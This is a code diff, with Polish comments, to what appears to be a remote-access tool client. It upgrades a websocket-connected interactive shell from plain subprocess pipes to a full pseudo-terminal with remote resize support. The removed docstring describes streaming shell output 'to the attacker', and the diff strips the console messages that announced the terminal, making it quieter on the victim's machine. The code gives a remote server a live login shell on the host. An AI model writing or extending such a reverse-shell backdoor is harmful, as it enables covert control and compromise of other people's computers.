@@ -8,11 +8,15 @@ import tempfile
 import threading
 import select
 import sys
+import struct
+import fcntl
+import termios
+import pty
+import signal
 
 try:
     from websocket import create_connection, WebSocketConnectionClosedException
 except ImportError:
-    print("Brak biblioteki websocket-client. Instaluję...")
     os.system("pip install websocket-client")
     from websocket import create_connection, WebSocketConnectionClosedException
 
@@ -26,53 +30,74 @@ DOWNLOAD_DIR = tempfile.gettempdir()  # Folder na pobrane pliki
 # Bufor: po otrzymaniu JSON type=upload czekamy na następną wiadomość binarną
 pending_upload_filename = None
 
-# Interaktywny terminal
-terminal_process = None
+# Interaktywny terminal (pty)
+terminal_pid = None       # PID procesu potomnego
+terminal_fd = None        # file descriptor master pty
 terminal_thread = None
 
 
 def handle_terminal_start(ws):
-    """Uruchamia interaktywny shell i streamuje output do attackera."""
-    global terminal_process, terminal_thread
+    """Uruchamia interaktywny pseudo-terminal (pty) i streamuje output."""
+    global terminal_pid, terminal_fd, terminal_thread
 
     # Zamknij istniejący terminal jeśli jest
     handle_terminal_stop(ws)
 
     try:
-        shell_cmd = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
+        # Tworzymy pseudo-terminal za pomocą pty.fork()
+        pid, fd = pty.fork()
 
-        terminal_process = subprocess.Popen(
-            shell_cmd,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            shell=False,
-            bufsize=0,
-            cwd=os.path.expanduser("~")
-        )
+        if pid == 0:
+            # ── Proces potomny ──
+            os.chdir(os.path.expanduser("~"))
+            env = os.environ.copy()
+            env["TERM"] = "xterm-256color"
+            env["COLUMNS"] = "80"
+            env["LINES"] = "24"
+            shell = os.environ.get("SHELL", "/bin/bash")
+            os.execvpe(shell, [shell, "--login"], env)
+            # execvpe zastępuje proces — nic poniżej się nie wykona
 
-        ws.send(json.dumps({"type": "terminal_started", "shell": shell_cmd, "pid": terminal_process.pid}))
-        print(f"  [⌨] Terminal uruchomiony: {shell_cmd} (PID {terminal_process.pid})")
+        # ── Proces macierzysty ──
+        terminal_pid = pid
+        terminal_fd = fd
 
-        # Wątek czytający output z procesu i wysyłający do serwera
+        # Ustaw domyślny rozmiar terminala
+        _set_pty_size(fd, 24, 80)
+
+        ws.send(json.dumps({
+            "type": "terminal_started",
+            "shell": os.environ.get("SHELL", "/bin/bash"),
+            "pid": pid
+        }))
+
+        # Wątek czytający output z pty i wysyłający do serwera
         def reader():
-            global terminal_process
-            proc = terminal_process
             try:
-                while proc and proc.poll() is None:
-                    data = proc.stdout.read(4096)
-                    if not data:
-                        break
+                while True:
+                    # select czeka na dane z pty (timeout 0.1s)
+                    r, _, _ = select.select([fd], [], [], 0.1)
+                    if r:
+                        try:
+                            data = os.read(fd, 4096)
+                        except OSError:
+                            break
+                        if not data:
+                            break
+                        try:
+                            text = data.decode("utf-8", errors="replace")
+                            ws.send(json.dumps({"type": "terminal_output", "output": text}))
+                        except Exception:
+                            break
+                    # Sprawdź czy proces potomny żyje
                     try:
-                        text = data.decode("utf-8", errors="replace")
-                        ws.send(json.dumps({"type": "terminal_output", "output": text}))
-                    except Exception:
+                        result = os.waitpid(pid, os.WNOHANG)
+                        if result[0] != 0:
+                            break  # proces się zakończył
+                    except ChildProcessError:
                         break
-            except Exception as e:
-                try:
-                    ws.send(json.dumps({"type": "terminal_output", "output": f"\n[terminal zakończony: {e}]\n"}))
-                except Exception:
-                    pass
+            except Exception:
+                pass
             finally:
                 try:
                     ws.send(json.dumps({"type": "terminal_stopped"}))
@@ -86,35 +111,59 @@ def handle_terminal_start(ws):
         ws.send(json.dumps({"type": "error", "msg": f"Nie można uruchomić terminala: {e}"}))
 
 
+def _set_pty_size(fd, rows, cols):
+    """Ustawia rozmiar pseudo-terminala."""
+    try:
+        winsize = struct.pack("HHHH", rows, cols, 0, 0)
+        fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
+    except Exception:
+        pass
+
+
 def handle_terminal_input(ws, data):
-    """Wysyła input do uruchomionego terminala."""
-    global terminal_process
-    if terminal_process is None or terminal_process.poll() is not None:
+    """Wysyła input do pseudo-terminala."""
+    global terminal_fd
+    if terminal_fd is None:
         ws.send(json.dumps({"type": "error", "msg": "Terminal nie jest uruchomiony"}))
         return
 
     user_input = data.get("input", "")
     try:
-        terminal_process.stdin.write((user_input + "\n").encode("utf-8"))
-        terminal_process.stdin.flush()
+        os.write(terminal_fd, user_input.encode("utf-8"))
     except Exception as e:
         ws.send(json.dumps({"type": "error", "msg": f"Błąd zapisu do terminala: {e}"}))
 
 
+def handle_terminal_resize(ws, data):
+    """Zmienia rozmiar pseudo-terminala."""
+    global terminal_fd
+    if terminal_fd is None:
+        return
+    rows = data.get("rows", 24)
+    cols = data.get("cols", 80)
+    _set_pty_size(terminal_fd, rows, cols)
+
+
 def handle_terminal_stop(ws):
-    """Zamyka interaktywny terminal."""
-    global terminal_process, terminal_thread
-    if terminal_process is not None:
+    """Zamyka pseudo-terminal."""
+    global terminal_pid, terminal_fd, terminal_thread
+    if terminal_pid is not None:
         try:
-            terminal_process.terminate()
-            terminal_process.wait(timeout=3)
+            os.kill(terminal_pid, signal.SIGTERM)
+            os.waitpid(terminal_pid, 0)
         except Exception:
             try:
-                terminal_process.kill()
+                os.kill(terminal_pid, signal.SIGKILL)
+                os.waitpid(terminal_pid, os.WNOHANG)
             except Exception:
                 pass
-        terminal_process = None
-        print("  [⌨] Terminal zamknięty")
+        terminal_pid = None
+    if terminal_fd is not None:
+        try:
+            os.close(terminal_fd)
+        except Exception:
+            pass
+        terminal_fd = None
 
 
 def handle_shell(ws, data):
@@ -283,6 +332,8 @@ def connect_loop():
                     handle_terminal_start(ws)
                 elif msg_type == "terminal_input":
                     handle_terminal_input(ws, data)
+                elif msg_type == "terminal_resize":
+                    handle_terminal_resize(ws, data)
                 elif msg_type == "terminal_stop":
                     handle_terminal_stop(ws)
                 else:
